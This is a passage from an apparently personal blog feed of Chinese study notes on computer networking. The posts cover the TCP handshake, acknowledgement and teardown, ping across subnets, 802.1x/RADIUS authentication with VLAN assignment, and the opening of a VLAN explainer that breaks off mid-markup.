域名对应的IP地址</p><p>所以说，TCP进程此时传送的是<strong>HTTP包</strong><br><br><br></p><h1 id="02-TCP进程三次握手"><a href="#02-TCP进程三次握手" class="headerlink" title="02 TCP进程三次握手"></a>02 TCP进程三次握手</h1><p><font color='blue'>TCP进程属于低调、稳健的老司机，属于不见兔子不撒鹰的狡猾猎人。既然是老司机，开车一定很稳，那么稳在哪里呢？</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153535778.jpg#pic_center" alt=""><br><font color='blue'> 老司机心想，如果将浏览器发来的IP地址+HTTP直接发送个IP进程，最后会产生一个IP包，但最终这个IP包是死是活，自己是无法知道的。 </font></p><p><font color='red'> 也许IP包遭遇了线路硬件故障、网络路劲堵塞被丢弃或者服务器压根就没有开机，最终这个IP包消失的无影无踪。</p><p><strong>那么老司机该怎么办么？</strong></font></p><p>老司机想出一个办法，<strong>先不发HTTP</strong>，想要<strong>确保自己的IP包</strong>（不包含任何用户数据）可以<strong>到达服务器</strong>，并且服务器的IP包也可以返回。（确定可以有来有回，就是可靠的）</p><p>这样的话，就可以保证</p><p>①双向路由路径是通畅的，<font color='red'>没有防火墙或访问列表的阻挡 </font></p><p>②如果IP包是可以返回的，说明服务器是正常工作的。</p><p><strong>那么三次握手连接具体是什么呢？</strong><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153556563.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>A:老大，有空吗？想和你说说话，<strong>听到请回答</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153607494.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>B:小A，听得到，你能听得到我吗？</p><p>A:听得到</p><p>TCP三次握手本身是使用IP进程来完成发送，由于通常通信的两台主机不在同一个网段，所以是三次不同网段的通信</p><p>在IP进程的眼里，三次握手就是三个IP包的交互（不考虑超时传输的情况下），还没有传输浏览器的HTTP之前，已经<strong>花费了三个IP包的代价</strong><br><br><br></p><h1 id="03-TCP三次握手后的数据传输"><a href="#03-TCP三次握手后的数据传输" class="headerlink" title="03 TCP三次握手后的数据传输"></a>03 TCP三次握手后的数据传输</h1><p>TCP进程经历了三次握手之后，只要使用TCP头将HTTP包打包起来，包的格式为TCP + HTTP ，发给IP进程就好了。</p><p><font color='blue'> 那么在IP进程看来，这只是一个IP包而已，IP包的格式为 IP + TCP + HTTP  </font><br><br><br></p><h1 id="04-TCP的确认机制"><a href="#04-TCP的确认机制" class="headerlink" title="04 TCP的确认机制"></a>04 TCP的确认机制</h1><p><strong>如何确定对方是否接收到这个IP包呢？</strong></p><p>TCP确认收货机制：<strong>对方发一个确认</strong>，喊一嗓子，IP包已经收到，那么本地TCP进程就放心了</p><p><font color='red'>那么，本地TCP进程如何知道是哪个IP包被对方确认收货了呢？ </font></p><p>序列号，<font color='blue'>就和网购时，卖家发货时，会在外包装打上一个序列号，当买家收货时确认产品序列号，这样卖家就会知道某件产品已经安全无误送到买家手中。 </font><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062015362011.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>TCP头就有一个序列号，比如A的TCP进程要传输1000字节数据，初始序列号就是从1开始，然后TCP把这1000个字节打包，然后层层封装、传输，并最终到达服务器TCP进程。这是发送端的序列号，从1-1000<br><br><br>而服务端确认收货号截至为1001，这是告诉对方1-1000序列号已经成功接受，在等着收1001的数据呢。本地TCP进程接受到服务端确认收货的消息，就安心等待服务器将 对应页面的内容发送过来了<br><br></p><p>这个过程一个数据，一个确认收货，一共两个IP包</p><p>服务器接受到请求后，将自己的主页封装成HTTP格式，服务器TCP进程发给本地一个包含网页的IP包，本地回复一个收货确认（IP+TCP）,这又是两个IP包<br><br><br></p><h1 id="05-TCP释放连接机制"><a href="#05-TCP释放连接机制" class="headerlink" title="05 TCP释放连接机制"></a>05 TCP释放连接机制</h1><p><font color='red'>本地浏览器将接受到的网页输出到屏幕上之后，为什么还需要将之前建立的TCP连接断开呢？继续保持不行吗？ </font></p><p>答案是不行的，因为TCP连接回占用资源，如果你依然保持TCP连接，回占用TCP端口连接、内存资源。<font color='blue'>如果你是老板，你肯定不会养一个闲着没事干，占着茅坑不拉屎，还吃你工资的人对吧。 </font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153711213.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>所以我们要释放TCP连接，把他给有需要的应用程序使用。<br><br><br></p><h1 id="06-TCP关闭连接"><a href="#06-TCP关闭连接" class="headerlink" title="06 TCP关闭连接"></a>06 TCP关闭连接</h1><p><font color='blue'> TCP连接可以看成两个水管，一个进水，一个出水 </font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620153724462.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><strong>从本地TCP进程来看，发数据用的时出水管，接受服务器数据使用进水管，释放连接意味着两个水管都关闭。</strong></p><p>如果本地TCP进程数据已经发完了，大可关闭自己的出水管，但是不能关闭进水管，因为你不确认对方是否还要运水过来。所以进水管的关闭需要由对方来关闭，因为对方知道还有没有数据来传输</p><p>那具体时如何关闭TCP连接呢？</p><p><font color='blue'>A:老大，我没有水要运了，准备关闭我的出水管了，收到请确认 </font><br><font color='blue'>B：小A，你出水管里的数据我已经接受完毕了，你可以关闭你的出水管了，确认完毕。 </font></p><p>这样子，A接受到B的回应，就会关闭出水管</p><p>如何，假设服务器也没有水要运给本地了，所以决定关闭服务器的出水口</p><p>B:小A，我也没有水要运了，准备关闭我的出水口，收到请确认！<br>A：老大，我已经接受完你出水管里的水，可以放心关闭了，确认完毕！</p><p>这样，一旦服务器接受小A的确认，就会关闭自己的出水口，服务器TCP进程释放资源</p><p><font color='red'> 而此时本地TCP因为无法确认服务器是否已经释放TCP连接，那本地TCP进程会怎么做呢？</font></p><p>启动定时器等待，如果超时以内没有接受到任何重传的消息，说明对方已经接受到自己的确认，已经关闭了TCP连接，释放了资源。<font color='red'> 而如果超时以内接受到了对方的超时重传，自己再确认，如何再等待，知道最终确认对方接受到自己的确认。 </font><br><br><br></p><h1 id="07-那么在本次的通信过程中，一共使用了多少个IP包呢？"><a href="#07-那么在本次的通信过程中，一共使用了多少个IP包呢？" class="headerlink" title="07 那么在本次的通信过程中，一共使用了多少个IP包呢？"></a>07 那么在本次的通信过程中，一共使用了多少个IP包呢？</h1><p>不考虑超时重传的情况下，整个通信过程一共使用了多少IP包呢？<br>建立三次握手，3个IP包<br>双向通信，2个IP包<br>释放连接，4个IP包</p><p><strong>共计11个IP包</strong><br>*<br>*<br>*<br>*<br>*<br></p><p><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——不同网段下的主机通信</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-bu-tong-wang-duan-xia-de-zhu-ji-tong-xin/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-bu-tong-wang-duan-xia-de-zhu-ji-tong-xin/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font></p><p><strong>我们以主机ping的过程举例，设定本地IP地址为192.168.8.104，目标IP地址为191.168.1.2</strong>。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620081834300.png#pic_center" alt=""><br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620080800523.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="不同网段主机通信工作流程"><a href="#不同网段主机通信工作流程" class="headerlink" title="不同网段主机通信工作流程"></a>不同网段主机通信工作流程</h1><p>不同主机通信的工作流程如下：<br><br></p><h2 id="1、判断不同网段"><a href="#1、判断不同网段" class="headerlink" title="1、判断不同网段"></a>1、判断不同网段</h2><p>192.168.8.104使用255.255.255.0的子网掩码去判断191.168.1.2，得出<strong>对方的网络号是191.168.1</strong><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062008081378.jpg#pic_center" alt=""><br>而<strong>自己的网络号是192.168.8</strong>，所以两者的网络号不同,属于不同网段的通信<br><br></p><h2 id="2、查找路由表"><a href="#2、查找路由表" class="headerlink" title="2、查找路由表"></a>2、查找路由表</h2><p><strong>网络号相同的主机</strong>，可以使用ARP广播来发现对方的MAC地址。但是网络号不同的主机则不能这样通信</p><p><strong>网络号不同的情况下</strong>，需要查找路由表，在路由表里来匹配192.168.1，一旦匹配到路由条目，则把IP包发给这条路由条目的下一台跳 <br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620080823914.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>如果路由表前几条都没有匹配到，那么就去最后一跳万能路由。<font color='blue'> 通俗地说，如果同学在外面漂泊四处碰壁，那么家就是最后的归宿。这个网段号0就是所有IP包最后没有成功匹配的归宿，而这个归宿就是缺省网关，也叫默认网关<br><br> </font></p><h2 id="3、发现网关硬件接口MAC"><a href="#3、发现网关硬件接口MAC" class="headerlink" title="3、发现网关硬件接口MAC"></a>3、发现网关硬件接口MAC</h2><p>网关肯定是和本机属于同一网段，可以从ARP缓存中或者ARP广播获知网关的MAC<br><br></p><h2 id="4、Ping包发给网关192-168-8-1"><a href="#4、Ping包发给网关192-168-8-1" class="headerlink" title="4、Ping包发给网关192.168.8.1"></a>4、Ping包发给网关192.168.8.1</h2><p>Ping包头部被封装以太网头部，其中有一个目的MAC地址，只要目的MAC填写成网关的MAC就好，那么这个Ping就会发送个网关192.168.8.1<br><br></p><h2 id="5、网关硬件接口接受以太网帧"><a href="#5、网关硬件接口接受以太网帧" class="headerlink" title="5、网关硬件接口接受以太网帧"></a>5、网关硬件接口接受以太网帧</h2><p>网关硬件接口接受到此以太网帧，发现帧的目的MAC是自己的MAC地址。就会接受存放在缓冲区，并通知IP层（进程）来取走。<br><br></p><h2 id="6、网关路由转发"><a href="#6、网关路由转发" class="headerlink" title="6、网关路由转发"></a>6、网关路由转发</h2><p>网关IP层从网卡复制来了IP包，接着要进行路由匹配查找。根据本地ARP缓存表或者ARP广播获知目的IP地址的MAC地址。然后将IP包添加以太网帧头，发送出去。<br><br></p><h2 id="7、Ping包被弹回"><a href="#7、Ping包被弹回" class="headerlink" title="7、Ping包被弹回"></a>7、Ping包被弹回</h2><p>191.168.1.2接受到Ping包，包的内容原封不动，依照第6步步骤将ping包回包发送回192.168.8.104<br><br></p><h2 id="8、Ping程序打印输出"><a href="#8、Ping程序打印输出" class="headerlink" title="8、Ping程序打印输出"></a>8、Ping程序打印输出</h2><p>192.168.8.104依据Ping包、回应包的序列号一一对应起来，如何分别计算出RTT时间统计。</p><p>一般都是4个Ping包，这样就会有RTT最大、最小、平均值，如果哪个序列号的Ping包在2s超时没有接收到回应包，则会认为Ping包丢失</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620081847400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨网段通信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——3A安全认证</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-3a-an-quan-ren-zheng/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-3a-an-quan-ren-zheng/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font></p><p><strong>本文将针对以下问题逐条进行解答：</strong></p><p>01 为什么需要安全认证？</p><p>02 入网安全三要素是什么？</p><p>03 如果公司员工的位置信息经常变动，是不是需要网络管理员一直配置Vlan呢？</p><p>04 3A认证具体的协议是如何工作的？<br>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620131916812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-安全认证的产生原因"><a href="#01-安全认证的产生原因" class="headerlink" title="01 安全认证的产生原因"></a>01 安全认证的产生原因</h1><p>我们知道有许多安全措施，其中包括DHCP反欺骗安全措施，ARP反欺骗安全措施。</p><p>DHCP反欺骗安全措施，限定了一台主机请求的IP地址数量，<font color='blue'>相当于规定了一个人最多吃两碗饭，如果你想要第三碗，我是不会给你的。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620131300739.jpg#pic_center" alt=""><br>ARP反欺骗安全措施,记载了IP地址、MAC地址、端口的对应信息，<font color='blue'> 如果你想欺骗我，我这都有记录，你是骗不了我的 </font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062013130924.gif#pic_center" alt=""><br><font color='red'> 虽然有这些安全措施，但是如果局域网没有认证，外来访客、合作伙伴都可以将电脑插入交换机，或者连上公司无线AP，以上介绍的种种安全措施又有何用呢？<br> </font></p><p><font color='blue'>是的，你房间里布置了各种安保措施，看似很安全。但是你大门却敞开着，妖魔鬼怪都可以进来逛一逛，这还安全嘛？</font></p><p>所以，<strong>认证，这是网络安全的前提</strong>，是布置安保措施必须做的。<br><br><br></p><h1 id="02-入网安全三要素"><a href="#02-入网安全三要素" class="headerlink" title="02 入网安全三要素"></a>02 入网安全三要素</h1><p>入网安全三大要素分别是：<br><strong>认证（Authentication）<br>授权（Authorization）<br>审计（Accounting</strong>）<br>简称AAA</p><p>具体来说：</p><p>1、首先，用户接入网络需要<strong>验证身份</strong></p><p>2、认证合法用户，然后<strong>给相对应的权限。</strong></p><p><font color='blue'>比如公司员工有最高权限，可以访问公司几乎所有网络<br>合作伙伴次之，可以访问特定的网络资源<br>而访客只需要有访问外部互联网的权限就可以了 </font></p><p>3、最后，要将用户的上网行为<strong>记录在日志文件</strong>里，可以追踪用户的所作所为，震慑用户不要为非作歹<br><br><br><br></p><h1 id="03-员工的位置信息经常变动情况下，管理员的VLAN配置"><a href="#03-员工的位置信息经常变动情况下，管理员的VLAN配置" class="headerlink" title="03 员工的位置信息经常变动情况下，管理员的VLAN配置"></a>03 员工的位置信息经常变动情况下，管理员的VLAN配置</h1><br><font color='red'> 在现实中，如果公司员工很多，成百上千人，而且会频繁更换位置。这就意味这用户与用户接入的交换机端口是动态的，不能根据某个端口确定某台主机，那么是不是需要管理员时刻盯着端口与主机的关系，给主机配置VLAN呢？<br><br> </font><p>这分明是不现实的，工作量太大了。而如何克服这个矛盾呢？</p><p>有的，这就是企业网目前正在使用的一项技术——<strong>ISE</strong></p><p>这项技术的原理是：<strong>通过认证身份信息，给主机配置身份信息对应的VLAN信息</strong></p><p>具体来说：</p><p>接入交换机一旦检测到用户信号，就会<strong>发起对用户的认证</strong>，然后把用户信息加密传输到后台的<strong>认证服务器</strong>，如Radius服务器，服务器获得用户的ID信息，认证通过之后，<strong>根据不同身份、不同部门、分配特定的VLAN</strong></p><p>这个<strong>特定的VLAN就代表不同的权限</strong>，然后后台服务器动态地将用户特定的VLAN传输给接入交换机，交换机在动态配置到交换机上，这一切都是动态的，网络管理员就不要死命的为用户配置VLAN信息了</p><p><br><br><br></p><h1 id="04-3A认证协议工作流程"><a href="#04-3A认证协议工作流程" class="headerlink" title="04 3A认证协议工作流程"></a>04 3A认证协议工作流程</h1><p>原理说起来简单，但是其实背后有着许多协议的交互，我们先从认证开始说起：</p><p>点对点链路使用PPP协议封装，在用PAC/CHAP/EAP来认证客户端。比如电话拨号PPP、宽带ADSL PPPoE 、光纤 EPON/GPNO PPPoE，最终都会使用这三个协议来认证用户</p><p>以太网是多路访问网络，使用802.1x协议来认证客户端，这是一个链路层的协议，直接将802.1x放在以太网帧后面，无须IP协议头，和ARP协议类似。下面，描述一下整个工作流程：</p><p>小明插入网线，打开电脑，电脑初始化TCP/IP协议栈，由一个独立进程构成的,IP进程负责IP协议的初始化，如IP地址、网络掩码等，这是给程序的一些参数初始化。</p><p>这时IP进程发现IP参数的获得方式是DHCP，于是发送DHCP Disvovery广播报文。</p><p><font color='red'> 交换机端口状态此时有点奇怪，接受到了DHCP报文直接丢弃了，这是为什么呢？ </font></p><p>因为此时端口还处于未认证状态，<font color='blue'>交换机认为你是陌生人，只接受你的认证报文， </font>换句话说，802.1x报文可以自由通信，其他一律禁行<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620131322375.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>接到了小明的DHCP报文，交换机知道有用户要接入，触发了认证过程：</p><p>1、交换机发一个802.1x报文给小明，目的MAC是小明的MAC，报文的内容是：<strong>请出示你的通行证（用户ID）</strong><br><br></p><p>2、小明的802.1x进程接收到，立马回复说：我的ID是xiaomin，你可以检查一下<br><br></p><p>3、交换机拿过小明的ID信息，加密传输小明的用户ID给Radius，让上头查一查<br><br></p><p>4、Radius服务器用共享密钥，解密交换机的加密报文，获得小明的用户ID，然后选取和小明账户相关的认证方法。<br><br></p><p>假设是EAP-MD5 Chalenge认证方法，则还需要对小明进行明文挑战，明文内容为：你真的是我们的人吗？使用IP/UDP/Radius/EAP封装，发给交换机<br></p><p>5、交换机提取出Radius里的EAP协议消息，在封装成Ethernet/802.1x/EAP，发给小明，由于这里EAP封装在二层协议头，所以称它位 EAP over LAN<br><br><br>6、小明电脑获得明文挑战内容：你真的是我们的人吗？  将其与小明账户密码做字符串连接，然后做MD5散列，生成一个挑战回答，并发送出去<br><br></p><p>7、交换机提取出EAP消息，然后IP/UDP/Radius/EAP封装，<strong>发给Radius服务器</strong><br><br></p><p>8、服务器获得小明的挑战回答，用本地数据库小明密码与挑战做同样的运算，得到自己的挑战回答，如果两值相等，则认证通过，否则认证失败<br><br><br>9、服务器给交换机发一个认证成功的消息，同时还有小明的VLAN10,以及<strong>端口特有配置参数</strong>。<br><br></p><p>10、交换机将获得小明端口号的信息，VLAN 10 等配置到端口上，同时更新端口为认证成功状态，即正常工作状态，发一个认证消息给小明，此时可以接受小明的任何报文<br><br></p><p>11、小明收到认证成功的消息，会触发DHCP进程继续发送 <strong>DHCP Discovery广播报文</strong>，此广播报文会被位于VLAN 10的网关接收，网关将此广播报文中级给DHCP服务器 10.10.10.10 ，<strong>触发后续DHCP操作</strong><br><br></p><p>12、小明有了自己的IP地址，可以继续登录公司的网络，然后完成所有进程的初始化，<strong>可以正常工作了</strong></p><p><br><br></p><h1 id="05-相关知识问答"><a href="#05-相关知识问答" class="headerlink" title="05 相关知识问答"></a>05 相关知识问答</h1><h2 id="1、如果打印机，扫描仪、古董服务器不支持802-1x认证，那么该如何认证它们呢？"><a href="#1、如果打印机，扫描仪、古董服务器不支持802-1x认证，那么该如何认证它们呢？" class="headerlink" title="1、如果打印机，扫描仪、古董服务器不支持802.1x认证，那么该如何认证它们呢？"></a>1、如果打印机，扫描仪、古董服务器不支持802.1x认证，那么该如何认证它们呢？</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620131333852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>因为这些设备通常情况下不会经常移动，所以我们可以直接使用MAC地址认证。</p><p>预先把这些机器的MAC地址输入认证服务器的数据库，<strong>对这些机器使用MAC做用户ID</strong>。</p><p>配置交换机安装以下顺序来认证用户、机器：</p><p><strong>①802.1x</strong></p><p><strong>②MAC</strong></p><p><strong>③默认</strong></p><p>如果机器不支持①，会超时时选择②，只要交换机可以捕获机器的任何报文，就可以获得其MAC，任何再进行认证，最终分配特定的VLAN</p><p>访客则会①、②超时，最终交换机会使用默认VLAN，这个默认VLAN只能访问Internet<br><br><br></p><h2 id="2、为何说不同的VLAN代表不同的访问权限？"><a href="#2、为何说不同的VLAN代表不同的访问权限？" class="headerlink" title="2、为何说不同的VLAN代表不同的访问权限？"></a>2、为何说不同的VLAN代表不同的访问权限？</h2><p>①在一个安全性较高的公司，网关一般由<strong>防火墙</strong>充当，防火墙使用物理接口下的子接口，采用802.1q封装，可以是任何VLAN里的一员</p><p>②VLAN则代表不同的网段，会通过访问控制列表ACL来进行权限控制</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620131345905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br><br><br><br><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 3A协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络——VLAN的前世今生</title>
      <link href="/2020/07/20/ji-suan-ji-wang-luo-vlan-de-qian-shi-jin-sheng/"/>
      <url>/2020/07/20/ji-suan-ji-wang-luo-vlan-de-qian-shi-jin-sheng/</url>
      
        <content type="html"><![CDATA[<p> <font color='blue'> 点赞后看，养成习惯<br>喜欢的话 可以点个关注哟<br>你们的点赞支持对博主们来说很重要哦 ！！！<br></font><br><strong>本文将针对以下问题逐条进行解答：</strong></p><p><strong>01 虚拟局域网出现的原因？</strong></p><p><strong>02 一台交换机，如何隔离不同网段的广播呢？</strong></p><p><strong>02 如何实现虚拟局域网？</strong></p><p>@<a href="为方便您的阅读，可点击下方蓝色字体，进行跳转↓↓↓">TOC</a><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105324802.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br></p><h1 id="01-虚拟局域网出现的原因"><a href="#01-虚拟局域网出现的原因" class="headerlink" title="01 虚拟局域网出现的原因"></a>01 虚拟局域网出现的原因</h1><p>我们先来看看一家公司的发展史。<br><br>最初，公司规模很小，只有几个人，都连在一台交换机上，所有主机都处于一个网段、一个广播域，简单方便。</p><p>后来，公司规模扩大，有了几十个人，一台交换机不够，用了两台交换机，所有主机还是处于一个网段、一个广播域。<br><br><font color='red'> 这个时候，一个广播域内几十台主机，网络变得有些嘈杂了。</font></p><p>这种情况下：<br><br>①对主机CPU性能也有影响，主机的CPU会被硬件中断，来处理这些广播（<font color='blue'> 你在饭堂写作业，是不是会被其他人的聊天打扰 </font>）<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105339297.gif#pic_center" alt=""><br>②广播域大了不利于流量控制，不利于安全管理（<font color='blue'> 饭堂里，你想要单独和某个人说秘密，这个秘密说不定被人听到了 </font>）<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105348429.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br>再后来，公司规模越来越大，有了几百号人，很多业务部门，比如研发、销售、市场、人力资源、财务部，<font color='red'> 如果都挤在一个网段，之间的通信都没有阻拦，比如财务部统计工资的消息到处传等等事情出现，就会严重公司工作的发展。</font></p><p>于是，管理员就这么想：<strong>不如我在不同的业务部门使用不同的网段，这样就可以使用防火墙、路由器对业务部门直接的流量进行控制、允许或拒绝，这样就可以解决隔离流量的问题了</strong></p><p>所以管理员买来一台路由器，路由器有4个接口，他把市场部、销售部、财务部、人力资源部分别连接在属于自己部门的交换机上，然后再分别连在路由器的物理接口上。<font color='blue'> 但是他还有3个部门没有接到路由器上呢，这该怎么办呢？</font></p><p><strong>1、使用扩展业务板</strong><br>    路由器数量不变，购买对应路由器的扩展插槽，多加几个接口（<font color='blue'> 路由器上多加几个接口 </font>）</p><p><strong>2、增加路由器数量</strong><br>     使用跟多的预算来购置更多的路由器（<font color='blue'>土豪有钱，我直接多买几台路由器 </font>）<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105359301.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><font color='blue'>但是如果以后有了更多的部门和网段，是不是意味着需要更多的路由器端口，有什么更好的方法嘛？</font></p><p>我们知道路由设备往往比交换设备贵，而且接口还少，那么我们转换思路看看，能不能用二层设备来实现流量隔离呢。<br>于是虚拟局域网技术就应运而生咯<br><br><br></p><h1 id="02-一台交换机，隔离不同网段的广播的方法"><a href="#02-一台交换机，隔离不同网段的广播的方法" class="headerlink" title="02 一台交换机，隔离不同网段的广播的方法"></a>02 一台交换机，隔离不同网段的广播的方法</h1><p><font color='blue'> <strong>可以在一台交换机上，创建不同的VLAN，代表不同的广播域</strong></font><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620105456656.gif#pic_center" alt=""><br><br><br></p><h1 id="03-虚拟局域网的实现"><a href="#03-虚拟局域网的实现" class="headerlink" title="03 虚拟局域网的实现"></a>03 虚拟局域网的实现</h1><p>如何实现<strong>一台交换机</strong>，划分研发部、人力资源两个广播域呢?<br><br></p><h2 id="1、在交换机上设置VLAN"><a href="#1、在交换机上设置VLAN" class="headerlink" title="1、在交换机上设置VLAN"></a>1、在交换机上设置VLAN</h2><p>  比如规定：<br>     研发部      VLAN 10<br>          人力资源 VLAN 20<br><br></p><h2 id="2、设置接入端口模式"><a href="#2、设置接入端口模式" class="headerlink" 